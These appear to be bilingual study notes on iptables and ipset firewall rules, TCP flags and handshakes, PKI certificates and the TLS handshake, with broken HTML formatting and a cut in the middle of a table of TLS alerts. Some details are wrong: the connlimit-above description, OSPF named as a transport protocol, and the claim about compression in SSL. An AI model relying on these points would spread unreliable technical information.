<li><strong>General Syntax : </strong>
<p>

                <strong>iptables [-t TABLE_NAME] [-COMMAND] [CHAIN]  [matches] [-j TARGET]</strong>
</p>
<p>

                <strong>[-t TABLE_NAME] : Indicates on which table the command operates. By default it is the <em>Filter</em> table.</strong>
</p>
<p>

        <strong>	</strong>
</p>
<p>

                <strong>[-COMMAND] : Indicates the operation we perform on a chain of the table.</strong>
</p>
<p>

                <strong>[CHAIN] : Indicates on which chain the command operates.</strong>
</p>
</li> 
</ul>
</li> 
</ul>
<p>

                <strong>[matches] : Indicates some conditions , characteristic to the packet that we need to perform an action.</strong>
</p>
<p>
<strong>				[-j TARGET] : Indicates what action is taken on </strong>
</p>
<p>

        <strong>        packets.</strong>
</p>
<ul>

<li><strong>Iptables [-t TABLE_NAME] -L -vn [CHAIN]:</strong>
<p>

                <strong>Print the rules of the specified table (<em>Filter</em> by default).</strong>
</p>
<p>

                <strong>Option -vn for more details.</strong>
</p>
<ul>

<li><strong>Differents common options for [-COMMAND]:</strong>

<table>
  <tr>
   <td>
<strong>-A</strong>
</li>
</ul>
</li>
</ul>
   </td>
   <td><strong>Append the rule to the end of the selected chain.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>-I [CHAIN] [POSITION]</strong>
   </td>
   <td><strong>Insert one or more rules in the selected chain on a specific position, by default on top (position 1).</strong>
   </td>
  </tr>
  <tr>
   <td><strong>-L</strong>
   </td>
   <td><strong>List all rules in the selected chain. If no chain is selected, all chains are listed.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>[-t TABLE_NAME] -F</strong>
   </td>
   <td><strong>Flush the selected chain ( all the chains in the table if none is given).</strong>
   </td>
  </tr>
  <tr>
   <td><strong>[-t TABLE_NAME] -Z</strong>
   </td>
   <td><strong>Zero (reset) the packet and byte counters in all chains, or only the given chain.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>-N</strong>
   </td>
   <td><strong>Create a new user-defined chain by the given name.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>[-t TABLE_NAME] -X</strong>
   </td>
   <td><strong>Delete the user-defined chain specified ( delete all user-defined chains if a chain is not specified).</strong>
   </td>
  </tr>
  <tr>
   <td><strong>-P [CHAIN] [ACTION]</strong>
   </td>
   <td><strong>Set the default policy for the built-in chain (INPUT, OUTPUT or FORWARD).</strong>
   </td>
  </tr>
  <tr>
   <td><strong>-D</strong>
   </td>
   <td><strong>Delete one or more rules from the selected chain.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>-R</strong>
   </td>
   <td><strong>Replace a rule in the selected chain.</strong>
   </td>
  </tr>
</table>


<ul>

<li><strong>Differents common options for [-matches]:</strong>

<table>
  <tr>
   <td>
<strong>-s --source [IP address | network address | domain name ]</strong>
</li>
</ul>
   </td>
   <td><strong>Match by source IP Network Address</strong>
   </td>
  </tr>
  <tr>
   <td><strong>-d --destination [IP address | network address | domain name ]</strong>
   </td>
   <td><strong>Match by destination IP Network Address</strong>
   </td>
  </tr>
  <tr>
   <td><strong>-m iprange --src-range [IP_start-IP_end]</strong>
   </td>
   <td><strong>Match by IP Range for source</strong>
   </td>
  </tr>
  <tr>
   <td><strong>-m iprange --dst-range [IP_start-IP_end]</strong>
   </td>
   <td><strong>Match by IP Range for destination</strong>
   </td>
  </tr>
  <tr>
   <td><strong>-m addrtype --src-type [UNICAST,MULTICAST,BROADCAST,...]</strong>
   </td>
   <td><strong>Match by Address Type for source</strong>
   </td>
  </tr>
  <tr>
   <td><strong>-m addrtype --dst-type [UNICAST,MULTICAST,BROADCAST,...]</strong>
   </td>
   <td><strong>Match by destination Type for source</strong>
   </td>
  </tr>
  <tr>
   <td><strong>-p [tcp | udp ] --dport [PORT]</strong>
   </td>
   <td><strong>Match by a single destination port</strong>
   </td>
  </tr>
  <tr>
   <td><strong>-p [tcp | udp ] --sport [PORT]</strong>
   </td>
   <td><strong>Match by a single source port</strong>
   </td>
  </tr>
  <tr>
   <td><strong>-m multiport [--dports|--sports] [PORT1, PORT2, .. ]</strong>
   </td>
   <td><strong>Match by multiple ports</strong>
   </td>
  </tr>
  <tr>
   <td><strong>-i [incoming_interface]</strong>
   </td>
   <td><strong>Match by incoming interface</strong>
<p>
<strong>Available for : INPUT, FORWARD and PREROUTING.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>-o [outgoing_interface]</strong>
   </td>
   <td><strong>Match by outgoing interface</strong>
<p>
<strong>Available for : OUTPUT, FORWARD and POSTROUTING.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>-p [PROTOCOL]</strong>
   </td>
   <td><strong>Match by protocol</strong>
   </td>
  </tr>
  <tr>
   <td><strong>! [matches]</strong>
   </td>
   <td><strong>Negating Matches</strong>
   </td>
  </tr>
  <tr>
   <td><strong>--syn</strong>
   </td>
   <td><strong>Match if the syn flag in set</strong>
   </td>
  </tr>
  <tr>
   <td><strong>--tcp-flags [list_mask] [list_comp]</strong>
   </td>
   <td><strong>Match by TCP flag. The first argument mask is the flags which we should examine, written as a comma-separated list, and the second argument comp is a comma-separated list of flags which must be set.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>-m state --state [list_state]</strong>
   </td>
   <td><strong>Match by packets state. list_state : comma separated values in uppercase letters.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>-m mac --mac-source [source_mac_adress]</strong>
   </td>
   <td><strong>Match by source mac address (it’s impossible by destination mac address )</strong>
   </td>
  </tr>
  <tr>
   <td><strong>-m time [OPTION]</strong>
   </td>
   <td><strong>Match by Date and Time. See the documentation for the options.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>-m connlimit [--connlimit-upto | --connlimit-above] [number]</strong>
   </td>
   <td><strong>Match by number of existing connections:</strong>
<p>
<strong>--connlimit-upto : match if the number of existing connections is less than n.</strong>
<p>
<strong>--connlimit-above : match if the number of existing connections is less than n.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>-m limit [--limit | --limit-burst ] [value]</strong>
   </td>
   <td><strong>Match by maximum matches per time-unit and before an above limit.</strong>
<p>
<strong>--limit : where value is the maximum matches per time-unit ( default second )</strong>
<p>
<strong>--limit-burst : where value is maximum matches before a above limit.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>-m recent [OPTIONS]</strong>
   </td>
   <td><strong>Match with dynamic database of blacklisted source IP addresses.</strong>
<p>
<strong>Options : </strong>
<ul>

<li><strong>--name [name_list]: Specify and creates a blacklist if not existed.</strong>
<p>

    <strong>path of the file : /proc/net/xt_recent/[name_list]</strong>
<ul>

<li><strong>--set : Adds the source IP address to the list.</strong>
<ul>

<li><strong>--update : Checks if the source IP address is in the list and updates the “last seen time”.</strong>
<ul>

<li><strong>--rcheck : Checks if the source Ip address is in the list and doesn't update the “last seen time”.</strong>
<ul>

<li><strong>--seconds [number]: Used with --update or --rcheck. Matches the packet only if the source IP address is in the list and the last seen time is valid.</strong>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td><strong>-m quota --quota [bytes]</strong>
   </td>
   <td><strong>Match by quota ( of packets ). When the quota is reached, the rule doesn’t match any more.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>-m set [OPTION]</strong>
   </td>
   <td><strong>Match using ipset</strong>
<p>
<strong>option : </strong>
<ul>

<li><strong>--match-set [name_set] [dst | src ]: Use the specified set of IP address.</strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<p>
<strong>Differents common options for [-j TARGET]:</strong>
</p>

<table>
  <tr>
   <td><strong>-j SET --add-set [name_set] [src |dst]</strong>
   </td>
   <td><strong>Add a entry in a set of ipset.</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td><strong> </strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<ul>

<li><strong>Rules written in the terminal are not saved after the system is shut down. To persist the rules, you have to write a script automatically executed when the system boots.</strong>
<ul>

<li><strong>Default Policy can be changed only for INPUT, OUTPUT and FORWARD chains. It can be changed using -P option. This is either accept or drop packet.</strong>
<p>

            <strong>Exemple:</strong>
</p>
<p>

            <strong>iptables -P INPUT DROP</strong>
</p>
</li>
</ul>
</li>
</ul>
<p>
<strong>			iptables -P OUTPUT ACCEPT</strong>
</p>
<p>
<strong>			iptables -P FORWARD DROP</strong>
</p>
<ul>

<li><strong>iptables-save [-c] [-t <em>table</em>] > [file name]:</strong>
</li>
</ul>
<p>
<strong>			Dump the iptables rules in a file. Then, we can load the rules</strong>
</p>
<p>

        <strong>of this file into memory with this command : iptables-restore</strong>
</p>
<p>

            <strong>[file name].</strong>
</p>
<p>
<strong>			option -c : save the bit and packet counter.</strong>
</p>
<ul>

<li><strong>To save iptables rules after restart :</strong> 
<ul>
 
<li><strong>Install iptable-persistent.</strong>
</li> 
</ul>
</li> 
</ul>
<p>
<strong> 				sudo apt update && sudo apt install iptables-persistent </strong>
</p>
<p>
<strong>				iptable-persistent automatically loads rules from this </strong>
</p>
<p>

            <strong>file : /etc/iptables/rules.v4</strong>
</p>
<ul>

<li><strong>iptables-save > /etc/iptables/rules.v4 to save iptables rules in this persistent file</strong>
</li>
</ul>
<ul>

<li><strong>To remove persistent iptables rules:</strong>
</li>
</ul>
<p>
<strong>				Edit /etc/iptables/rules.v4</strong>
</p>
<ul>

<li><strong>Packets states ( for stateful firewall ):</strong> 
<ul>
 
<li><strong>NEW : First packet from a connection.</strong>
 
<li><strong>ESTABLISHED : packets that are part of an existing connection.</strong>
 
<li><strong>RELATED : packets that are requesting a new connection and are already part of an existing connection ( Ex: FTP).</strong>
 
<li><strong>INVALID : Packets that are not part of any existing connection.  The packet can't be identified or that it does not have any state.</strong>
 
<li><strong>UNTRACKED : packets marked within the raw table with the NOTRACK target.</strong>
</li> 
</ul>
</li> 
</ul>
<ul>

<li><strong>Ipset is an extension to iptables that allows us to create firewall rules that match entire “sets” of addresses at once.</strong>
<p>

            <strong>It’s very efficient when dealing with large sets.</strong>
</p>
<p>

            <strong>Ipset lets you create huge lists of ip addresses and/or ports, which are stored in a tiny piece of ram with extreme efficiency.</strong>
</p>
<p>

            <strong>Some commands and features :</strong>
</p>
<ul>

<li><strong>ipset [-N| create] [name] [METHOD] [OPTION] : create a new set called [named] using the method [METHOD] for searching and storing information</strong>
<p>

                <strong>( example : hash:ip ). </strong>
</p>
</li>
</ul>
</li>
</ul>
<ul>

<li><strong>ipset [-A| add] [name] [IP_ADR] : Add the IP address in the set.</strong>
</li>
</ul>
<ul>

<li><strong>ipset [-L| list] [name_set]: Print out all the sets.</strong>
</li>
</ul>
<ul>

<li><strong>ipset [del| -D] [name_set] [entry] : Delete the entries in the set.</strong>
</li>
</ul>
<ul>

<li><strong>ipset [-F| flush] [name_set] : Delete all the entries the specified set.</strong>
</li>
</ul>
<ul>

<li><strong>ipset [destroy |-X] [name_set] : Delete the specified set. You can only delete a set if there is no correspondence with a rule in iptables.</strong>
</li>
</ul>
<ul>

<li><strong>“maxelem” is a variable that corresponds to the maximum elements that a set can contain.</strong>
<p>

                <strong>By default, is 65 535.</strong>
</p>
</li>
</ul>
<ol>

<li> Network
</li>
</ol>
<h3>					TCP header FLag</h3>


<p>

<img src="images/image8.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>SYN : Only the first packet from sender as well as receiver should have this flag set. This is used for synchronizing sequence number.</strong>
</p>
<p>
<strong>ACK : It is used to acknowledge packets which are successfully received by the host. The flag is set if the acknowledgement number field ( sended ) contains a valid acknowledgement number.</strong>
</p>
<p>
<strong>RST ( Reset ) : It is used to terminate the connection if the RST sender feels something is wrong with the TCP connection. It can get sent from a receiver side when the packet is sent to a particular host that was not expecting it.</strong>
</p>
<p>

<img src="images/image9.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>PUSH : Transport layer by default waits for some time for application layer to send enough data equal to maximum segment size so that the number of packets transmitted on the network minimizes, which is not desirable by some applications like interactive applications(chatting). </strong>
</p>
<p>
<strong>Similarly, transport layer at receiver end buffers packets and transmit to application layer if it meets certain criteria.</strong>
</p>
<p>
<strong>This problem is solved by using PSH. Receiver transport layer, on seeing PSH = 1 immediately forwards the data to application layer.</strong>
</p>
<p>
<strong>In general, it tells the receiver to process these packets as they are received instead of buffering them.</strong>
</p>
<p>
<strong>URG ( Urgent ) : Data inside a segment with URG = 1 flag is forwarded to the application layer immediately even if there are more data to be given to the application layer. It is used to notify the receiver to process the urgent packets before processing all other packets. The receiver will be notified when all known urgent data has been received.</strong>
</p>
<p>

<img src="images/image10.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>				     TCP 3-way handShake</strong>
</p>
<p>

<img src="images/image11.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>MSS : Max Segment Size.</strong>
</p>
<p>
<strong>WINDOW : When we start a TCP connection, the hosts will use a receive buffer where we temporarily store data before the application can process it.</strong>
</p>
<p>
<strong>When the receiver sends an acknowledgment, it will tell the sender how much data it can transmit before the receiver will send an acknowledgment. We call this the window size. Basically, the window size indicates the size of the receive buffer.</strong>
</p>
<p>
<strong>				 TCP connection termination</strong>
</p>
<p>

<img src="images/image12.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>Difference between closed and filtered port :</strong> 
<ul>
 
<li><strong>Closed port = In some cases, it means that no application is listening on this port. A specific tcp packet is returned.</strong> 
<ul>
 
<li><strong>Filtered port = Port opened but packets dropped by a firewall.</strong>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
<p>

        <strong>Encapsulation des couches :</strong>
</p>
<p>

<img src="images/image13.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image14.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Modèle TCP/IP :
<p>

        
<img src="images/image15.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>Le nom de modèle TCP/IP est étroitement lié à deux protocoles : le protocole TCP (Transmission Control Protocol) et le protocole IP (Internet Protocol). Ceci est en partie dû au fait que ce sont les deux protocoles les plus utilisés pour Internet.</strong>
</li>
</ul>
</li>
</ul> 
<ul>
 
<li><strong>L’origine du modèle TCP/IP remonte au réseau ARPANET. </strong>
<ul>

<li><strong>Le protocole UDP intervient lorsque le temps de remise des paquets est prédominant et non la fiabilité.</strong> 
<ul>
 
<li><strong>D'autres protocoles de la couche Transport que TCP, UDP:  SCTP, OSPF, SPX, ATP.</strong>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul> 
<ul>
 
<li><strong>...</strong>
</li> 
</ul>
<ul>

<li>Certificat et PKI: 
<ul>
 
<li><strong>PKI (Public Key Infrastructure) est un système de gestion des clefs publiques qui permet de gérer des listes importantes de clefs publiques et d'en assurer la fiabilité, pour des entités généralement dans un réseau. </strong>
<ul>

<li><strong>Une infrastructure PKI fournit donc quatre services principaux:</strong>
<p>

                <strong>- fabrication de bi-clés.</strong>
</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>

                <strong>- Certification de clé publique et publication de</strong>
</p>
<p>

                <strong>  certificats.</strong>
</p>
<p>

                <strong>- Révocation de certificats.</strong>
</p>
<p>

                <strong>- Gestion de la fonction de certification.</strong>
</p>
<ul>

<li><strong>Une PKI utilise des mécanismes de signature et certifie des clés publiques qui permettent de chiffrer et de signer des messages ainsi que des flux de données, afin d'assurer la confidentialité, l'authentification, l'intégrité et la non-répudiation (l'émetteur des données ne pourra pas nier être à l'origine du message car la signature a été faite avec sa clef privée).</strong>
</li>
</ul>
<ul>

<li><strong>Faiblesse : si l’une quelconque parmi les autorités de certification certifie un site frauduleux, ce certificat sera vérifié correctement par des millions de navigateurs.</strong>
</li>
</ul>
<ul>

<li><strong>Une des raisons de l'apparition de la notion de certification est de se prémunir de l’attaque Man In The Middle : On doit être sur que la clé publique utilisée n’appartient pas à un attaquant.</strong>
</li>
</ul>
<ul>

<li><strong>Chaque navigateur ou service qui utilise des certificats contient une liste de certificats racine approuvés. Lors de la visite d'un site web avec une connexion TLS/SSL, la validité d'un certificat est vérifiée en contrôlant les empreintes digitales du certificat et des certificats intermédiaires associés jusqu'à ce que l'empreinte digitale du certificat racine coïncide.</strong>
</li>
</ul>
<p>

            <strong>Structure d’un Certificat :</strong>
</p>
<p>

<img src="images/image16.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>	En résumé :</strong>
</p>
<ul>

<li><strong>Numero de serie</strong>

<li><strong>Clé publique</strong>

<li><strong>information de l'autorité de certification qui a signé </strong>

<li><strong>Information sur le détenteur du certificat</strong>

<li><strong>Période de validité</strong>

<li><strong>Signature</strong>
</li>
</ul>
<p>

            <strong>     Comment vérifier un certificat ?</strong>
</p>
<p>

<img src="images/image17.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image18.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>Dans une infrastructure à clé publique ; pour obtenir un certificat numérique, l'utilisateur fait une demande auprès de l'autorité d'enregistrement. Celle-ci génère un couple de clef (clé publique, clé privée), envoie la clé privée au client, applique une procédure et des critères définis par l'autorité de certification qui certifie la clé publique et appose sa signature sur le certificat, parfois fabriqué par un opérateur de certification.</strong>
</p>
<ul>

<li>Protocole TLS ( Transport Layer Security ) / SSL ( Secure Sockets Layer ) : 
<ul>
 
<li><strong>TLS est un protocole qui permet l’établissement d’une connexion sécurisée (chiffrée, intègre et authentifiée).</strong> 
<ul>
 
<li><strong>Les protocoles TLS (et SSL) sont situés entre la couche du protocole d’application et la couche TCP/IP, où ils peuvent sécuriser et envoyer des données d’application à la couche de transport. Étant donné que les protocoles fonctionnent entre la couche application et la couche transport, les protocoles TLS et SSL peuvent prendre en charge plusieurs protocoles de la couche application.</strong> 
<ul>
 
<li><strong>La principale différence entre SSL et TLS est que ce dernier utilise des algorithmes de chiffrement plus fort et qu’il peut supporter plusieurs extensions.</strong> 
<ul>
 
<li><strong>Le protocole TLS est formé par 4 sous protocoles :</strong>  
<ul>
  
<li><strong>Protocole Handshake ( Création des clefs )</strong>
  
<li><strong>Protocole Record ( application des clefs )</strong>
  
<li><strong>Protocole Change Cipher Spec (CCS)</strong>
  
<li><strong>Protocole Alert ( Gestion des erreurs )</strong>
<ul>

<li><strong>1) Protocole Handshake ( TLS Handshake ):</strong>   
<ul>
   
<li><strong>C’est le protocole qui régit l’établissement d’une connexion entre deux entités d’un réseau. Il gère l’authentification du serveur et/ou du client, la négociation des algorithmes de chiffrement et la génération des clés symétriques.</strong>
<p>

            
<img src="images/image19.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>1) C -> S.ClientHello: le client initie une requête en envoyant un message de type ClientHello qui contient:</strong> 
<ul>
 
<li><strong>Version: la plus haute version de SSL/TLS que puisse utiliser le client.</strong> 
<ul>
 
<li><strong>Random: un horodatage de 32 bits et une valeur aléatoire de 28 octets générée par le client qui sera utilisée pour la dérivation des clés. The client random and the server random are later used to generate the key for encryption.</strong> 
<ul>
 
<li><strong>CipherSuite: une liste, par ordre décroissant de préférence, des suites cryptographiques que supporte le client.</strong>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
<p>

                <strong>Cipher suites are identified by strings. A sample cipher suite string is ( example ): TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256. This string contains the following information:</strong>
</p>
<ul>

<li><strong>TLS is the protocol being used.</strong>

<li><strong>ECDHE is the key exchange algorithm (Elliptic curve Diffie–Hellman Ephemeral).</strong>
<p>

                    <strong>ECDSA is the authentication algorithm (Elliptic Curve Digital Signature Algorithm).</strong>
</p>
<ul>

<li><strong>AES_128_GCM is the data encryption algorithm (Advanced Encryption Standard 128 bit Galois/Counter Mode).</strong>

<li><strong>SHA256 is the Message Authentication Code (MAC) algorithm Secure Hash Algorithm 256 bit).</strong> 
<ul>
 
<li><strong>Extensions: les différentes extensions TLS supportées par le client ( extensions such as supported groups for elliptic curve cryptography, point formats for elliptic curve cryptography, signature algorithms, and more).</strong>
<p>

                <strong>If the server cannot provide the additional functionality, the client may abort the handshake if needed.</strong>
</p>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
<ul>

<li><strong>Compression_methods_list : This is the method that is going to be used for compressing the SSL packets. By using compression, we can achieve lower bandwidth usage and therefore, faster transfer speeds. But using compression is risky.</strong>
</li>
</ul>
<ul>

<li><strong>Session ID: un nombre, qui identifie la connexion; (optionnel).</strong>
<p>

                <strong>Et peut être d’autres champs “moins importants”.</strong>
</p>
</li>
</ul>
<ul>

<li><strong>2)  S -> C .ServerHello: le serveur répond au client avec un message de type ServerHello. A Server Hello may either contain selected options (from among those proposed during Client Hello) or it may be a handshake failure message. cette étape qui contient:</strong>  
<ul>
  
<li><strong>Version: la plus haute version de SSL/TLS que puisse utiliser le serveur ( the selected protocol version );</strong>  
<ul>
  
<li><strong>Random: un horodatage de 32 bits et une valeur aléatoire de 28 octet;</strong>  
<ul>
  
<li><strong>CipherSuite: la suite cryptographique retenue pour la session. Le serveur sélectionne la première suite qu’il connaît dans la liste transmise par le client;</strong>
<ul>

<li><strong>Compression_methods : The server selects the compression method from among Compression Methods sent in the Client Hello.</strong>  
<ul>
  
<li><strong>Extensions: les différentes extensions TLS supportées par le serveur.</strong>
<ul>

<li><strong>3)  S -> C .ServerCertificate: Le serveur envoie son certificat X509 qui contient des informations sur sa clé publique.</strong>
<p>

        <strong>In rare cases, the server may require the client to be authenticated with a client certificate. If so, the client provides its signed certificate to the server.</strong>
</p>
<ul>

<li><strong>4)  S. Server Key Exchange Generation : The server calculates “a private/public keypair” for key exchange ( Diffie-Hellman ).</strong>
<p>

        <strong>It will do this via an elliptical curve method ( using sometimes the x25519 curve ).</strong>
</p>
<p>

        <strong>The private key is chosen by selecting an integer between 0 and 2^(256-1). It does this by generating 32 bytes (256 bits) of random data.</strong>
</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>

        <strong>The public key is chosen by multiplying the point x=9 on the x25519 curve by the private key.</strong>
</p>
<ul>

<li><strong>5)  S -> C .ServerKeyExchange : The server provides information for key exchange. </strong>
<p>

        <strong>As part of the key exchange process, both the server and the client will have a keypair of public and private keys, and will send the other party their public key ( using elliptical curve Diffie-Hellman method ).</strong>
</p>
<p>

        <strong>The shared encryption key will then be generated using a combination of each party's private key and the other party's public key </strong>
</p>
<p>

        <strong>( Diffie-Hellman ) .</strong>
</p>
<p>

        <strong>Maybe the parties have agreed on a cipher suite using ECDHE, meaning the keypairs will be based on a selected Elliptic Curve, Diffie-Hellman will be used, and the keypairs are Ephemeral (generated for each connection) rather than using the public/private key from the certificate.</strong>
</p>
</li>
</ul>
<ul>

<li><strong>6).  S -> C .ServerHelloDone: Le serveur indique qu’il attend une réponse du client. The server indicates it's finished with its half of the handshake.</strong>
</li>
</ul>
<ul>

<li><strong>4)  C. Client Key Exchange Generation : Like the server, The client calculates “a private/public keypair” for key exchange with the same method ( using elliptical curve Diffie-Hellman method ).</strong>
</li>
</ul>
<ul>

<li><strong>6). C -> S.ClientKeyExchange: Just like the server, The Client provides information for key exchange.</strong>
</li>
</ul>
<ul>

<li><strong>4)  C. Client Encryption calculation : The client now has the information to calculate the encryption keys that will be used by each side. </strong>
<p>

        <strong>It uses the following information in this calculation:</strong>
</p> 
<ul>
 
<li><strong>server random (from Server Hello)</strong>
 
<li><strong>client random (from Client Hello)</strong>
 
<li><strong>server public key (from Server Key Exchange)</strong>
 
<li><strong>client private key (from Client Key Generation)</strong>
</li> 
</ul>
</li> 
</ul>
<p>

        <strong>The client multiplies the server's public key with the client's private key using the curveXXXX() algorithm. The 32-byte result is called the PreMasterSecret.</strong>
</p>
<p>

        <strong>The client then calculates the MasterSecret ( 48 bytes ) from the PreMasterSecret, client_random, server_random.</strong>
</p>
<p>

        <strong>Cette transformation est essentielle car le PreMasterSecret est d’une taille différente selon la méthode utilisée pour sa génération. Il faut donc dériver cette valeur en une autre avec une valeur constante ( MasterSecret de 48 byte ).</strong>
</p>
<p>

        <strong>We then generate the final encryption keys using the MasterSecret, client_random, server_random.</strong>
</p>
<p>
<strong>		final encryption keys :</strong>
</p>
<ul>

<li><strong>client MAC key: For client authentication and integrity with whatever MAC algorithm you chose in the cipher suite.</strong>
<ul>

<li><strong>server MAC key: For server authentication and integrity with whatever MAC algorithm you chose in the cipher suite.</strong>
<ul>

<li><strong>client write key : For the symmetric encryption.</strong>
<ul>

<li><strong>server write key : For the symmetric encryption.</strong>
<ul>

<li><strong>client write IV :  IV used by a mode of operation of some symmetric algorithm that could be chosen.</strong>
<ul>

<li><strong>server write IV : IV used by a mode of operation of some symmetric algorithm that could be chosen.</strong>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>
<strong>		The symmetric ciphers chosen in the handshake will dictate</strong>
</p>
<p>

        <strong>how long these keys we generate need to be.</strong>
</p>
<p>

        <strong>To recap : </strong>
</p>
<p>

        <strong>Diffie-Hellman -> PreMasterSecret -> MasterSecret ( 48 bytes ) -> 4 ( or 6 with IV ) variable-length keys.</strong>
</p>
<p>
<strong>		</strong>
</p>
<ul>

<li><strong>7). C -> S .ChangeCipherSpec: The client indicates that it has calculated the shared encryption keys and that all following messages from the client will be encrypted with the client write key.</strong>
<p>

        <strong>In TLS 1.3, this message type has been removed because it can be inferred.</strong>
</p>
<p>

        <strong>At this point, the client is ready to switch to a secure, encrypted environment. The Change Cipher Spec protocol is used to change the encryption.</strong>
</p>
</li>
</ul>
<ul>

<li><strong>8). C -> S .Finished: To verify that the handshake was successful and not tampered with, the client calculates verification data and encrypts it with the client write key.</strong>
</li>
</ul>
<p>
<strong>The verification data is built from a hash of all handshake  messages and verifies the integrity of the handshake process.</strong>
</p>
<ul>

<li><strong>4)  S. Server Encryption calculation : Same as the client : calculate the Final Keys.</strong>
</li>
</ul>
<ul>

<li><strong>9).  S -> C .ChangeCipherSpec: pareil côté serveur.</strong>
</li>
</ul>
<ul>

<li><strong>10). S -> C .Finished: pareil coté server. The last message of the handshake process from the server (sent encrypted) signifies that the handshake is finished.</strong>
</li>
</ul>
<ul>

<li><strong>2) Protocole Record</strong> 
<ul>
 
<li><strong>C’est le protocole qui gère la transmission des données chiffrées sous une forme homogène en les encapsulant, il a pour objectifs:</strong>
</li> 
</ul>
</li> 
</ul>  
<ul>
  
<li><strong>Confidentialité: les données sont chiffrées en utilisant les clés produites lors de la négociation.</strong>  
<ul>
  
<li><strong>Intégrité et Authenticité: Grâce aux signatures HMAC. Cette signature est elle aussi générée à l’aide des clés produites lors de la négociation.</strong>  
<ul>
  
<li><strong>Encapsulation:  permet aux données SSL/TLS d’être transmises de manière normalisée et reconnues sous une forme homogène.</strong>
</li>  
</ul>
</li>  
</ul>
</li>  
</ul>
<p>

            <strong>Les étapes du processus d’encapsulation du protocole Record sont les suivantes:</strong>
</p>
<p>

    
<img src="images/image20.png" width="" alt="alt_text" title="image_tooltip">

</p> 
<ul>
 
<li><strong>Segmentation: les données sont découpées en blocs de taille inférieure à 16 ko;</strong> 
<ul>
 
<li><strong>Compression: les données sont compressées en utilisant l’algorithme choisi lors de la négociation. A noter: à partir de SSL v3.0, il n’y a plus de compression;</strong> 
<ul>
 
<li><strong>Signature MAC: une signature des données est générée à l’aide de la clé MAC (dans le cas de l’utilisation de l’extension MAC_then_encrypt);</strong> 
<ul>
 
<li><strong>Chiffrement: le paquet obtenu est chiffré à l’aide de la fonction définie lors de la négociation et de la key.encryption;</strong> 
<ul>
 
<li><strong>Ajout de l’en-tête: l’en-tête SSL/TLS est ajouté et le paquet est passé à la couche inférieure. Il contient:</strong>  
<ul>
  
<li><strong>Content-Type: indique le type de paquet SSL et TLS contenu dans l’enregistrement;</strong>
  
<li><strong>Major Version, Minor Version: numéros de version du protocole SSL/TLS utilisé;</strong>
  
<li><strong>Length: taille du fragment SSL et TLS.</strong>
</li>  
</ul>
</li>  
</ul>
</li>  
</ul>
</li>  
</ul>
</li>  
</ul>
</li>  
</ul>
<p>
<strong>		</strong>
</p>
<p>
<strong>			À la réception des paquets, le destinataire vérifie l’en-tête du</strong>
</p>
<p>

        <strong>paquet, le déchiffre, vérifie le champ HMAC et rassemble les</strong>
</p>
<p>

            <strong>différents blocs.</strong>
</p>
<p>

            <strong>The handshake can currently use 5 different algorithms to do the key exchange: RSA, Diffie-Hellman, Elliptic Curve Diffie-Hellman and the ephemeral versions of the last two algorithms.</strong>
</p>
<p>

            <strong>On peut noter que les données chiffrées sont seulement ceux de la Couche Application.</strong>
</p>
<ul>

<li><strong>3) Protocole Change Cipher Spec</strong> 
<ul>
 
<li><strong>Ce protocole contient un seul message de 1 octet ChangeCipherSpec et permet de modifier les algorithmes de chiffrement et établir de nouveaux paramètres de sécurité. Il indique au protocole Record le changement des suites cryptographiques.</strong>
<ul>

<li><strong>4) Protocole Alert</strong> 
<ul>
 
<li><strong>Ce protocole spécifie les messages d’erreur que peuvent s’envoyer clients et serveurs. Les messages sont composés de deux octets. Le premier est soit warning ( connexion instable ) soit fatal. </strong>
<p>

                <strong>Si le niveau est fatal, la connexion est abandonnée. </strong>
</p>
<p>

                <strong>Le deuxième octet donne le code d’erreur.</strong>
</p>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
<p>
<strong>				Exemple de type d’erreurs :</strong>
</p>

<table>
  <tr>
   <td><strong>             erreurs fatales</strong>
   </td>
   <td><strong>                 Warnings</strong>
